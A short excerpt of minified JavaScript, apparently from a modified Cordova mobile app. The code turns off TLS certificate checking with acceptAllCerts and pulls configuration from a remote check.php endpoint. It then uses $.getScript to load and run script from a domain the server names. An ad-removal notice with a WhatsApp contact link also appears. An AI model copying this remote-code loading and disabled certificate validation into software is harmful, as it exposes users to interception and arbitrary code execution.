    ...
    e && cordovaHTTP.acceptAllCerts(!0, function() {
        cordovaHTTP.get("https://m.kotakputih.casa/api/check.php", {}, {}, function(e) {
            ...
            if (assetdom = a.asset_dom, dom = a.dom, mvReq = a.mvReq, tvReq = a.tvReq, imgReq = a.imgReq, !t) {
                ...
                localStorage.notice && "15" == localStorage.notice || ($.alert("<div>Sakizu<br>- Hide Banner<br>- Ads Renoved<br>- Disable auto open web while playing video<br><br>if still showed<a href='https://wa.me/628995019601' style='color:#c6aa28;'>WhatsApp</a></div>"), localStorage.notice = "15"), $.getScript("https://task."+assetdom+"/chk/httpget/");
